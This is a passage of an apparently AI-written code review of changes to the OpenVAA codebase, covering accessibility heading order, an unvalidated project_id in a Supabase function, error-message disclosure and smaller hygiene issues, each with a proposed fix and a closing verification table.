git grep -nE '^\s*[*/#-]+.*(\((from|see|in|at|per|of)\)|\b(in|from|at|per)\)\.|\(\s*[0-9]+\s*\)\.)' -- apps packages tests
# Verb-phrase breakage from token deletion.
git grep -nE 'which see phase|property see phase|As of [A-Z]{2}-[0-9]+ \(see phase' -- apps packages tests
```

### WR-09: The docs landing page gained a new heading-order violation in the same phase that fixed one

**File:** `apps/docs/src/routes/+page.svelte:172` (new block, lines 169-182)

**Issue.** The new YouthVotes card uses `<h4 class="mb-md font-bold">YouthVotes</h4>`. The page's full
heading inventory is:

```
line 158  <h4>   Version 0.1 Shiba is out now!     (pre-existing)
line 172  <h4>   YouthVotes                        (ADDED BY THIS PHASE)
line 184  <h2>   Main Features
line 201  <h2>   See OpenVAA in Action
```

There is **no `<h1>` on the page at all**, and the two `h4`s precede both `h2`s. The new heading
therefore skips from the (absent) document level straight to h4 and sits above its own superordinate
sections in source order. WCAG 2.1 SC 1.3.1 (Info and Relationships): a screen-reader user navigating by
heading meets "YouthVotes" as a fourth-level subsection of nothing.

What makes this a finding rather than inherited debt is the phase's own conduct: commit `f7076dbfe`
("close the h1-to-h4 heading skip on the results statistics page") fixed exactly this defect class at
`statistics/+page.svelte:129,155`, using exactly the right technique — promote the level, pin the
rendered size with a utility class. The same phase then added a fresh instance three commits later
without applying its own remedy.

**Fix.** Give the page an `<h1>` (the hero section at lines 129-135 is the natural place) and demote
both cards to the level below it, preserving the rendered size the same way the statistics fix did:

```svelte
<!-- h3, not h4: with the page <h1> in the hero and the <h2> section headings below,
     h3 is the first level available to these cards. `text-base` holds the rendered
     size at the former h4 (app.css @layer base gives h3 `text-lg font-bold`, h4
     `text-base font-bold`; the utility wins on size only, so the weight is unchanged). -->
<h3 class="mb-md text-base font-bold">YouthVotes</h3>
```

Apply the same to line 158 so the two sibling cards stay consistent.

### WR-10: `identity-callback` accepts a caller-supplied `project_id` with no validation

**File:** `apps/supabase/supabase/functions/identity-callback/index.ts:187,196,301-310`

**Issue.**

```ts
const { id_token, project_id } = body;
// ...
const projectId = project_id || Deno.env.get('DEFAULT_PROJECT_ID') || DEFAULT_SEED_PROJECT_ID;
// ...
.from('candidates').insert({ first_name, last_name, project_id: projectId, auth_user_id: userId })
```

`project_id` arrives in the request body, is never validated against any allowlist, and is written
straight into the `candidates` row via the **service_role** client, which bypasses RLS by design.

**Concrete failure scenario.** Any holder of a valid bank-auth id_token — a legitimate user of the
deployment — POSTs `{ id_token, project_id: '<some other tenant's project UUID>' }` and self-registers
as a candidate inside a project they have no relationship with. In a multi-tenant deployment (an
explicitly stated 2026 roadmap item in CLAUDE.md) that is a cross-tenant authorization gap. Combined
with CR-01, the token need not even belong to this deployment's relying party.

Pre-existing rather than introduced here, but the file is in scope and the trust boundary of this exact
function is the phase's stated subject.

**Fix.** Do not honour a body-supplied project. If a multi-project self-registration flow is genuinely
required, validate it:

```ts
// `project_id` is caller-controlled and this client is service_role (RLS bypassed),
// so an unvalidated value is a cross-tenant write. Only projects that have opted into
// self-registration may be targeted.
const requestedProjectId = typeof project_id === 'string' ? project_id : undefined;
const defaultProjectId = Deno.env.get('DEFAULT_PROJECT_ID') || DEFAULT_SEED_PROJECT_ID;

let projectId = defaultProjectId;
if (requestedProjectId && requestedProjectId !== defaultProjectId) {
  const { data: allowed } = await supabaseAdmin
    .from('projects')
    .select('id')
    .eq('id', requestedProjectId)
    .eq('allows_self_registration', true)
    .maybeSingle();
  if (!allowed) {
    return new Response(JSON.stringify({ error: 'Invalid project_id' }), {
      status: 400,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    });
  }
  projectId = requestedProjectId;
}
```

### WR-11: Raw internal error messages are returned to callers on six paths, inconsistently

**Files:**
- `apps/frontend/src/routes/admin/(protected)/argument-condensation/+page.server.ts:48-50`
- `apps/supabase/supabase/functions/send-email/index.ts:142, 294-297`
- `apps/supabase/supabase/functions/identity-callback/index.ts:207, 223, 240, 392`

**Issue.** The phase's `console.*` sweep converted `question-info`'s catch to
`logDebugError(...)` + a generic `fail(500, { error: 'Internal server error' })`, which is correct. The
structurally identical `argument-condensation` catch three files over now logs via `logDebugError` but
**still returns the raw message to the browser**:

```ts
} catch (err) {
  logDebugError(`[Admin App argument condensation] ${err instanceof Error ? err.message : String(err)}`);
  const message = err instanceof Error ? err.message : String(err);
  return fail(500, { type: 'error', error: message });   // <- raw
}
```

Two sibling actions, same shape, opposite disclosure posture, touched in the same phase. Whichever is
right, they should not disagree.

`condenseArguments` calls out to an LLM provider and the Supabase data writer; those libraries put
endpoint URLs, model identifiers and occasionally request-bearing detail into `error.message`. The
Edge-Function sites are the same pattern: `details: rpcError.message` (a raw PostgREST/Postgres error,
which can name columns, constraints and functions) and `details: message` on the outer catch-all, which
covers pre-authorization code paths.

Admin- and authenticated-only in every case, which is why this is Warning and not Critical.

**Fix.** Adopt `question-info`'s posture uniformly — log the detail server-side, return a generic
message and, if the caller needs to correlate, a request id:

```ts
} catch (err) {
  logDebugError(`[Admin App argument condensation] ${err instanceof Error ? err.message : String(err)}`);
  return fail(500, { type: 'error', error: 'Internal server error' });
}
```

and drop the `details:` field from the Edge Function responses (the `console.error` at
`identity-callback/index.ts:390` already retains it server-side).

---

## Info

### IN-01: The statistics heading fix removes the level skip but leaves the section labels unheaded

**File:** `apps/frontend/src/routes/(voters)/(located)/results/[[electionTab]]/statistics/+page.svelte:113, 129, 155`

The `h4` → `h2 class="text-base"` change is correct, and the rendered-size reasoning in the new comment
checks out against `apps/frontend/src/app.css:285-292` (h2 = `text-xl font-bold`, h4 = `text-base
font-bold`; the utility overrides size only, weight unchanged). `MainContent` does supply the `<h1>`.

What the fix does not address is that `Expander`'s `title` renders as a plain
`<div class="collapse-title ...">` (`apps/frontend/src/lib/components/expander/Expander.svelte:156-157`),
not a heading. The question titles are the actual section labels on this page. The resulting outline
under the single `h1` is therefore N repetitions of `h2 "All candidates"` followed by `h2 <org name>`,
with nothing indicating which question any of them belongs to — a heading list that is now
well-*ordered* but no more *navigable* than before.

Suggest either rendering `Expander`'s title inside a configurable heading element
(`<svelte:element this={titleTag ?? 'div'}>`), or giving each `<div>` wrapper an
`aria-labelledby` pointing at the expander title.

### IN-02: One `$derived(ctx.dataRoot)` alias survives the destructure sweep

**File:** `apps/frontend/src/routes/candidate/(protected)/preview/+page.svelte:32`

```ts
const dataRoot = $derived(ctx.dataRoot);
```

This is the intermediate-alias shape CLAUDE.md's `#version`-bridge carve-out explicitly forbids, and
which commit `f91356687` removed from the results layout. It is **currently harmless** — `dataRoot` is
read only inside `loadCandidate()` (lines 66-67), a plain async function outside any tracking scope, so
the referential-equality skip has nothing to suppress. But the file was touched by this phase (a
comment edit at line 31 that now reads "never destructure" directly above the forbidden alias), and it
stands as a live counter-example to the convention the phase spent a commit enforcing.

The equivalent read in `(voters)/nominations/+page.svelte:30`
(`const nominations = ctx.dataRoot.candidateNominations;`) is a plain non-reactive `const`, which *would*
be the stale-cold-entry bug — except that `(voters)/nominations/+layout.svelte:31-60` gates `children`
behind a `ready` flag set only after `provideNominationData`, so the page cannot mount before the data
exists. Not a defect; noting it so a future reader does not re-flag it.

Suggested fix for `preview`: read `ctx.dataRoot.provideEntityData(...)` / `ctx.dataRoot.getCandidate(...)`
directly and delete the alias.

### IN-03: One client-side `console.error` remains in the admin app

**File:** `apps/frontend/src/routes/admin/(protected)/jobs/+page.svelte:35`

The server-side sweep is **complete** — I verified zero `console.*` remain anywhere under
`apps/frontend/src/lib/server/` or in any `apps/frontend/src/routes/admin/**/*.server.ts`. This one is
client-side and outside the stated remit, but it is the last `console.*` in the admin surface and ships
to the browser bundle. Suggest routing it through `logDebugError` for consistency with the two actions
the phase just converted.

### IN-04: `loginRedirectTarget.ts` lives in `src/routes/` rather than `$lib/`

**File:** `apps/frontend/src/routes/loginRedirectTarget.ts`

Functionally fine — SvelteKit only treats `+`-prefixed files as routes, and `src/routes/README.md:18`
documents the placement. But every other shared helper in this codebase lives under `$lib/utils/`, and
the two importers reach it with `../../loginRedirectTarget`, a deep relative climb that the repo's own
ESLint config bans for `lib` paths (`apps/frontend/eslint.config.mjs:96-104`, `patterns` block).
Relocating to `$lib/utils/auth/loginRedirectTarget.ts` would make the import `$lib/utils/auth/...`, put
the unit test from WR-03 in the conventional place, and stop the module sitting in a directory whose
contents are otherwise route definitions.

### IN-05: `send-email` does not validate recipient ids and silently drops unknown users

**File:** `apps/supabase/supabase/functions/send-email/index.ts:74-79, 134-152`

Two small robustness gaps, both surfaced by the RPC repair now that the call actually reaches Postgres:

1. `recipient_user_ids` is validated as "a non-empty array" only. Elements are passed to a `uuid[]`
   parameter, so a single malformed string aborts the whole batch with a Postgres cast error, surfaced
   to the admin as an opaque 500 with `details` (see WR-11) rather than a 400 naming the bad id.
2. `resolve_email_variables` silently `CONTINUE`s past any id with no `auth.users` row
   (`502-email-helpers.sql:64-67`). The function then reports `success: true` with `sent: N` for a
   subset, and the response contains no field telling the caller *which* ids were dropped — only the
   count differs from what was requested.

Suggest validating each id against a UUID regex up front (400 on failure, naming the offender), and
diffing `recipients` against `recipient_user_ids` to return an explicit `skipped: string[]`.

### IN-06: The hygiene rule was applied inconsistently within a single line

**File:** `tests/scripts/determinism-batch.sh:266`

```bash
echo "# Determinism batch ledger (criterion 3, INTEG-02)"
```

The phase reference (`Phase 138`) was stripped but `INTEG-02` — a planning-artifact token of exactly the
kind the codemod exists to remove, and which was stripped from the *docblock* eight lines earlier — was
left in the emitted ledger heading. Cosmetic, but it means generated evidence files still carry
planning identifiers after a phase whose purpose was to remove them. Suggest `"# Determinism batch
ledger"`.

---

## Verification notes on the eight nominated targets

Recorded explicitly so a later reader can tell "checked and sound" from "not reached".

| # | Target | Verdict |
|---|--------|---------|
| 1 | Open-redirect fix (`loginRedirectTarget.ts` + 2 login actions) | **Sound.** Regex executed against 18 vectors, all correct. Applied on the only redirect path in each action; both fall back to `buildRoute(...AppHome)`. Gaps: no tests (WR-03), third site missed (WR-04), placement (IN-04). |
| 2 | `send-email` RPC repair | **Correct.** `p_user_ids`/`p_template_body`/`p_template_subject` match `502-email-helpers.sql:22-25` and `migrations/00001_initial_schema.sql:2962-2965`; the two `''` template args are genuinely unused by the function body, so passing empty strings is harmless. TLS change is a separate defect (CR-02); error leakage is WR-11. |
| 3 | `identity-callback` issuer check | **Inert — see CR-01.** Signature and `exp`/`nbf` are validated (jose defaults); issuer and audience are both skipped in every documented deployment. Failures do reject rather than fall through (lines 219-227). No nonce/replay binding on this path. |
| 4 | `pem-to-jwk` passphrase rejection | **Fails safely** (exit 1, no key material logged, correct remediation for PKCS#8). Incomplete for legacy OpenSSL encrypted PEMs (WR-05). |
| 5 | Svelte 5 reactivity fix (2 layouts) | **Correct on both.** `appSettings` → `$derived` alias (value-replacing, safe, and both files use it reactively only). `dataRoot` → direct `voterCtx.dataRoot.<prop>` at lines 180 and 353, never aliased. Repo-wide scan found no new destructure or alias in any changed route file; one pre-existing alias survives elsewhere (IN-02). |
| 6 | Admin `console.*` removal | **Complete and clean.** Zero `console.*` remain under `src/lib/server/` or in any admin `*.server.ts`. No error handling was lost — both catches gained `logDebugError`, and two `console.info` diagnostics were *upgraded* to `controller.info(...)` so they now reach the job progress log. The deleted `getJobProgress` call was debug-only and its result was unused. Residual: WR-11 (disclosure asymmetry), IN-03 (one client-side call). |
| 7 | `lint-schema.mjs` | **Both fixes right.** Port 54322 matches `config.toml:29`. The 0-based `indkey` slice is correct in both directions (verified arithmetically for k=1 and k>1, including the shorter-index case); `connamespace` scoping is correct. Remaining false negatives: WR-07. Unrelated injection: WR-06. |
| 8 | `performance-budget.spec.ts` | **Budget NOT weakened** — `TIME_TO_MATCHES_BUDGET_MS = 5000` and `RESULTS_FETCH_BUDGET = 13` both unchanged, no retry, no extended locator timeout, no flaky annotation. The N+1 guard can still fail. But its partition is time-based rather than load-based (WR-02), its calibration evidence now describes a different load than the one measured (WR-02), and the spec's own legible-failure property was weakened by not raising the test timeout (WR-01). |

---

_Reviewed: 2026-08-18_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
_Diff base: ca10b9736_
